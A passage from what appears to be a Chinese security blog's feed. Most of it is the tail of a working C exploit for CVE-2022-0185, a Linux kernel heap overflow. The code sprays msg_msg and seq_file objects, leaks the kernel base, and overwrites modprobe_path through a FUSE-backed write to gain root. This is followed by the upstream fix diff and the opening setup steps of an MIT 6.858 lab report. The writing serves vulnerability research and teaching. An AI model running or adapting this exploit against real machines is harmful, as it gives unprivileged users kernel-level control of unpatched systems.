class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(evil_buf + offset, buf, size);<br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief make an out-of-bound write to the next object in kmalloc-4k,</span><br><span class="hljs-comment"> * note that the buf before will always be appended to a &quot;,=&quot;,</span><br><span class="hljs-comment"> * for a ctx-legacy_data with 4095 bytes&#x27; data, the &#x27;,&#x27; will be the last byte,</span><br><span class="hljs-comment"> * and the &#x27;=&#x27; will always be on the first by of the object nearby</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * @param buf buf to write to next object</span><br><span class="hljs-comment"> * @return int - the fd for filesystem context</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">oobWritePrepare</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> fs_fd;    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leakKernelBase</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <span class="hljs-type">int</span> msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span> seq_fd[SEQ_FILE_NUM];<br>    <span class="hljs-type">char</span> m_ts_buf[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">uint64_t</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-comment">/* create message queue */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] create message queue for data leaking...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray msg_msg in half of message queues and seq_file */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray msg_msg in half of message queues and seq_files...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (MSG_QUEUE_NUM / <span class="hljs-number">2</span>); i++) &#123;<br>        <span class="hljs-built_in">memset</span>(&amp;primary_msg.mtext, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-keyword">sizeof</span>(primary_msg) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i],&amp;primary_msg, <span class="hljs-keyword">sizeof</span>(primary_msg),MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to send message!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts...&quot;</span>);<br>    fs_fd = oobWritePrepare();<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <br>             <span class="hljs-string">&quot;arttnbaarttnbaarttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">/* spray msg_msg into the left half of message queues and seq_files */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray msg_msg in another half of message queues and seq_files..&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (MSG_QUEUE_NUM / <span class="hljs-number">2</span>); i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-built_in">memset</span>(&amp;primary_msg.mtext, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-keyword">sizeof</span>(primary_msg) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i],&amp;primary_msg, <span class="hljs-keyword">sizeof</span>(primary_msg),MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to send message!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* oob write to overwrite m_ts of one msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] oob write to overwrite m_ts of one msg_msg...&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(m_ts_buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(m_ts_buf));<br>    *((<span class="hljs-type">long</span>*) m_ts_buf) = <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xff0</span>;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, m_ts_buf, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* spray more seq_operations */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray more seq_operations...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = MSG_QUEUE_NUM; i &lt; SEQ_FILE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* check for oob read */</span><span class="hljs-type">size_t</span> data_leak = <span class="hljs-number">-1</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for oob reading...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-type">ssize_t</span> rcvsz;<br>    <br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-keyword">if</span> ((rcvsz = peekMsg(msqid[i], buf, <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xff0</span> - <span class="hljs-number">8</span> + <span class="hljs-number">0x10</span>, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] failed to read at %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to msgrcv(MSG_COPY)!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* normal queue, just ignore */</span><br>        <span class="hljs-keyword">if</span> (rcvsz == (<span class="hljs-number">0xfd0</span> + <span class="hljs-number">0x18</span>)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (<span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xfd0</span>) / <span class="hljs-number">8</span>; j++) &#123;<br>            <span class="hljs-comment">//printf(&quot;[----data dump][%d] %p\n&quot;, j, buf[j]);</span><br>            <span class="hljs-keyword">if</span> (buf[j] &gt; kernel_base &amp;&amp; ((buf[j] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x4d0</span>)) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] get data leak: %lx\n&quot;</span>, buf[j]);<br>                data_leak = buf[j];<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>out:<br>    <span class="hljs-keyword">if</span> (data_leak == <span class="hljs-number">-1</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to leak kernel info!&quot;</span>);<br>    &#125;<br><br>    kernel_offset = data_leak - <span class="hljs-number">0xffffffff813834d0</span>;<br>    kernel_base += kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] modprobe_path: %lx\n&quot;</span>, <span class="hljs-number">0xffffffff82891160</span> + kernel_offset);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitraryWriteByMsg</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> msqid, evil_file_fd;<br>    <span class="hljs-type">char</span> *nearby_page, *evil_page;<br>    <span class="hljs-type">int</span> msg_sz;<br><br>    msg_sz = <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0x18</span>;<br><br>    <span class="hljs-keyword">if</span> ((evil_file_fd = open(EVIL_FILE_PATH, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to open evil file in FUSE!&quot;</span>);<br>    &#125;<br><br>    nearby_page = (<span class="hljs-type">char</span>*) mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, <br>                               MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    evil_page = (<span class="hljs-type">char</span>*) mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1338000</span>, <span class="hljs-number">0x1000</span>,  PROT_READ | PROT_WRITE, <br>                             MAP_SHARED | MAP_FIXED, evil_file_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (evil_page != (<span class="hljs-type">char</span>*)<span class="hljs-number">0x1338000</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to map for FUSE file!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(nearby_page, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br>    <br>    exp_fs_fd = oobWritePrepare();<br><br>    writeMsg(msqid, nearby_page - <span class="hljs-number">0xfd0</span> + <span class="hljs-number">8</span>, msg_sz, MSG_TYPE);<br>    <br>    munmap(nearby_page, <span class="hljs-number">0x1000</span>);<br>    munmap(evil_page, <span class="hljs-number">0x1000</span>);<br>    close(evil_file_fd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    <span class="hljs-type">int</span> seq_fd[SEQ_FILE_NUM], leak_msqid[MSG_QUEUE_NUM], shell_fd;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x2000</span>];<br>    <span class="hljs-type">uint64_t</span> *data;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] CVE-2022-0185 - exploit by arttnba3&quot;</span>);<br><br>    <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to unshare()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* to run the exp on the specific core only */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">/* register for FUSE */</span><br>    system(<span class="hljs-string">&quot;mkdir -p &quot;</span> EVIL_MOUNT_PATH);<br>    <span class="hljs-keyword">if</span> (fuse_main(<span class="hljs-keyword">sizeof</span>(evil_args) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>*) - <span class="hljs-number">1</span>, evil_args, <br>                  &amp;a3fuse_evil_ops, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to create FUSE!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* leak kernel base */</span><br>    leakKernelBase();<br><br>    <span class="hljs-comment">/* prepare file for triggering modprobe_path */</span><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/fake&quot;</span>);<br><br>    <span class="hljs-comment">/* prepare file for fake modprobe_path */</span><br>    shell_fd = open(<span class="hljs-string">&quot;/tmp/evil.sh&quot;</span>, O_RDWR | O_CREAT);<br>    write(shell_fd, cat_flag, <span class="hljs-keyword">sizeof</span>(cat_flag));<br>    close(shell_fd);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/evil.sh&quot;</span>);<br><br>    <span class="hljs-comment">/* exploit */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-type">int</span> flag_fd;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] trying arbitrary write for no.%d time...\n&quot;</span>, i);<br><br>        arbitraryWriteByMsg();<br>        system(<span class="hljs-string">&quot;/tmp/fake&quot;</span>);<br><br>        flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR);<br>        <span class="hljs-keyword">if</span> (flag_fd &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Successfully overwrite the modprobe_path!&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03.æ¼æ´ä¿®å¤"></a>0x03.æ¼æ´ä¿®å¤</h1><p>è¯¥æ¼æ´åœ¨å†…æ ¸ä¸»çº¿çš„ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=722d94847de29310e8aa03fcbdb41fc92c521756">è¿™ä¸ª commit</a> å½“ä¸­è¢«ä¿®å¤ï¼Œä¸»è¦å°±æ˜¯å°†å‡æ³•æ¢æˆäº†åŠ æ³•ï¼Œé¿å…äº†æ— ç¬¦å·æ•´å‹ä¸‹æº¢çš„é—®é¢˜ï¼Œç¬”è€…è®¤ä¸ºè¿™ä¸ªä¿®å¤è¿˜æ˜¯æ¯”è¾ƒæˆåŠŸçš„ï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/fs/fs_context.c b/fs/fs_context.c</span><br><span class="hljs-comment">index b7e43a780a625..24ce12f0db32e 100644</span><br><span class="hljs-comment">--- a/fs/fs_context.c</span><br><span class="hljs-comment">+++ b/fs/fs_context.c</span><br><span class="hljs-meta">@@ -548,7 +548,7 @@</span> static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)<br>       param-&gt;key);<br> &#125;<br> <br><span class="hljs-deletion">-if (len &gt; PAGE_SIZE - 2 - size)</span><br><span class="hljs-addition">+if (size + len + 2 &gt; PAGE_SIZE)</span><br> return invalf(fc, &quot;VFS: Legacy: Cumulative options too large&quot;);<br> if (strchr(param-&gt;key, &#x27;,&#x27;) ||<br>     (param-&gt;type == fs_value_is_string &amp;&amp;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;è¿˜æ˜¯ mount å¥½&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="ææƒ" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>ã€EXPR.0x01ã€‘MIT 6.858 è¯¾ç¨‹å®éªŒæŠ¥å‘Š</title>
    <link href="http://blog.arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/"/>
    <id>http://blog.arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/</id>
    <published>2022-12-24T18:15:28.000Z</published>
    <updated>2023-05-31T10:39:14.197Z</updated>
    
    <content type="html"><![CDATA[<p>æ„Ÿè§‰ä¸å¦‚ CTF 7 å¤©é€Ÿæˆè¯¾ç¨‹â€¦ç”»è´¨â€¦</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="http://css.csail.mit.edu/6.858/2022/">MIT 6.858</a> æ˜¯é¢å‘é«˜å¹´çº§æœ¬ç§‘ç”Ÿä¸ç ”ç©¶ç”Ÿå¼€è®¾çš„ä¸€é—¨å…³äº<strong>è®¡ç®—æœºç³»ç»Ÿå®‰å…¨</strong>ï¼ˆsecure computer securityï¼‰çš„è¯¾ç¨‹ï¼Œå†…å®¹åŒ…æ‹¬å¨èƒæ¨¡å‹ï¼ˆthreat modelsï¼‰ã€å±å®³å®‰å…¨çš„æ”»å‡»ï¼ˆattacks that compromise securityï¼‰ã€å®ç°å®‰å…¨çš„æŠ€æœ¯ï¼ˆtechniques for achieving securityï¼‰</p><p>åœ¨ YouTube ä¸Šæœ‰<a href="https://www.youtube.com/playlist?list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">å¾€å¹´çš„è¯¾ç¨‹å›æ”¾</a>ï¼Œé…æœ‰è‹±æ–‡å­—å¹•ï¼Œä¸è¿‡ä½œä¸ºä¸€ä¸ªå¹¶éæ˜¯å¯¹å®‰å…¨ä¸€æ— æ‰€çŸ¥çš„å®‰å…¨å°ç™½ï¼Œç¬”è€…ä¸»è¦è¿˜æ˜¯æŒ‘è‡ªå·±ä¸ç†Ÿæ‚‰çš„é‚£ä¸€å—è·³ç€å¬ï¼ˆç¬‘ï¼‰</p><p>è¿™ä¸ªè¯¾ç¨‹ä¸€å…±æœ‰äº”ä¸ª Labï¼š</p><ul><li>Lab1ï¼šç¼“å†²åŒºæº¢å‡ºï¼ˆbuffer overflowï¼‰</li><li>Lab2ï¼šæƒé™åˆ†ç¦»ä¸æœåŠ¡ä¾§æ²™ç®±ï¼ˆprivilege separation and server-side sandboxingï¼‰</li><li>Lab3ï¼šç¬¦å·æ‰§è¡Œï¼ˆsymbolic executionï¼‰</li><li>Lab4ï¼šæµè§ˆå™¨å®‰å…¨ï¼ˆbrowser securityï¼‰</li><li>Lab5ï¼šå®‰å…¨çš„æ–‡ä»¶ç³»ç»Ÿï¼ˆsecure file systemï¼‰</li></ul><p>å‰å››ä¸ª Lab ä¸»è¦æ˜¯åŸºäº MIT å¼€å‘çš„ä¸€ä¸ªå« <code>zookws</code> çš„ web server å®Œæˆçš„</p><h2 id="PRE-ç¯å¢ƒæ­å»º-amp-amp-è¯´æ˜"><a href="#PRE-ç¯å¢ƒæ­å»º-amp-amp-è¯´æ˜" class="headerlink" title="PRE. ç¯å¢ƒæ­å»º &amp;&amp; è¯´æ˜"></a>PRE. ç¯å¢ƒæ­å»º &amp;&amp; è¯´æ˜</h2><p>è¿™é‡Œç»™å‡ºä¸‰ç§æ­å»ºå®éªŒç¯å¢ƒçš„æ–¹å¼</p><h3 id="Method-I-ï¼ˆæ¨èï¼‰ä½¿ç”¨-MIT-æä¾›çš„-VM-é•œåƒ"><a href="#Method-I-ï¼ˆæ¨èï¼‰ä½¿ç”¨-MIT-æä¾›çš„-VM-é•œåƒ" class="headerlink" title="Method I.ï¼ˆæ¨èï¼‰ä½¿ç”¨ MIT æä¾›çš„ VM é•œåƒ"></a>Method I.ï¼ˆæ¨èï¼‰ä½¿ç”¨ MIT æä¾›çš„ VM é•œåƒ</h3><blockquote><p>å‚è§ <a href="http://css.csail.mit.edu/6.858/2022/labs/lab1.html">Lab 1</a></p></blockquote><p>MIT æä¾›äº†ä¸€ä¸ª  <a href="https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip">course VM image</a> ï¼Œå…¶ä¸­æœ‰ç€ä¸€ä¸ª Ubuntu 21.10 çš„ç³»ç»Ÿï¼Œç™»å½•çš„ç”¨æˆ·åä¸º <code>student</code>ï¼Œå¯†ç ä¸º <code>6858</code>ï¼Œä¸‹è½½è§£å‹åæ ¹æ®è‡ªèº«çš„æœ¬åœ°ç¯å¢ƒè¿›è¡Œå¯¹åº”çš„æ“ä½œï¼š</p><ul><li>ä½¿ç”¨ KVM è¿è¡Œï¼šç›´æ¥è¿è¡Œ <strong><code>./6.858-x86_64-v22.sh</code></strong> å³å¯</li><li>ä½¿ç”¨ VMwareè¿è¡Œï¼šæ–°å»ºè™šæ‹Ÿæœºâ†’ç¨åå®‰è£…æ“ä½œç³»ç»Ÿâ†’é€‰æ‹©ç³»ç»Ÿ <code>Linux &gt; Debian 9.x 64-bit</code> â†’ç§»é™¤åŸæœ‰è™šæ‹Ÿç£ç›˜â†’æ·»åŠ æ–°çš„è™šæ‹Ÿç£ç›˜â†’é€‰æ‹©  <code>6.858-x86_64-v22.vmdk</code> å³å¯</li></ul><p>å¯¹äºé X86 æ¶æ„çš„å¤„ç†å™¨ç¯å¢ƒï¼Œ<del>ğŸ‘´çš„å»ºè®®æ˜¯åˆ«åšäº†</del>ï¼Œåœ¨å®éªŒæ‰‹å†Œé‡Œæ¨èå®‰è£… qemu ï¼Œç¬”è€…å°±ä¸æ‘˜æŠ„ä¸€éäº†</p><p><img src="https://s2.loli.net/2022/12/07/bjhUwo5k9q8EiTJ.png" alt="image.png"></p><p>å½“ç„¶æ²¡æœ‰å›¾å½¢ç•Œé¢åªæœ‰ä¸€ä¸ª tty æ¯”è¾ƒéš¾å—ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æ˜¯æ¨èç”¨ ssh è¿ä¸Šå»åšï¼Œå› ä¸ºè™šæ‹Ÿæœºåœ¨æœ¬åœ°æ‰€ä»¥ç›´æ¥ <code>ip addr show dev eth0</code> æ‰¾åˆ° IP å <code>ssh student@YOUR_IP</code> å°±è¡Œï¼š</p><p><img src="https://s2.loli.net/2022/12/07/MJcV1zZdS5NvnjE.png" alt="image.png"></p><p>ä¹‹åè¿˜æ˜¯æŒ‰æƒ¯ä¾‹æŠŠä»£ç æ‹‰åˆ°æœ¬åœ°ï¼Œå¹¶ä½¿ç”¨ <code>make</code> æ„å»ºä¸€ä¸‹ <code>zookws</code> çœ‹æœ‰æ²¡æœ‰å•¥é—®é¢˜ï¼Œæ²¡æŠ¥é”™å°±ğŸ†—ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> lab</span><br><span class="hljs-meta prompt_">lab$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>zookd</code> è´Ÿè´£æ¥æ”¶ HTTP è¯·æ±‚ï¼Œå…¶ç”± C ç¼–å†™ï¼ŒHTTP ç›¸å…³çš„ä»£ç ä½äº <code>http.c</code> ä¸­ï¼ŒHTTP åè®®ç›¸å…³èµ„æ–™<a href="https://www.garshol.priv.no/download/text/http-tut.html">è§æ­¤å¤„</a></p><p>zookd æœ‰ä¸¤ç§ç‰ˆæœ¬ï¼š</p><ul><li><code>zookd-exstack</code>ï¼šæ ˆå…·æœ‰å¯æ‰§è¡Œæƒé™</li><li><code>zookd-nxstack</code>ï¼šæ ˆä¸å…·æœ‰å¯æ‰§è¡Œæƒé™</li></ul><p>ç”¨ä»¥è¿›è¡Œè¯„åˆ†çš„ <code>zookd</code> ä½äº <code>bin.tar.gz</code> ä¸­</p><p>æ­¤å¤–ï¼ŒMIT è¿˜æä¾›äº†ä¸€ä¸ªç”¨ä»¥æ¸…ç†ç¯å¢ƒçš„ <code>clean-env.sh</code> è„šæœ¬ï¼Œç”¨ä»¥ç¡®ä¿æ¯æ¬¡çš„æ‰§è¡Œç¯å¢ƒéƒ½æ˜¯ç›¸åŒçš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿è¡Œ 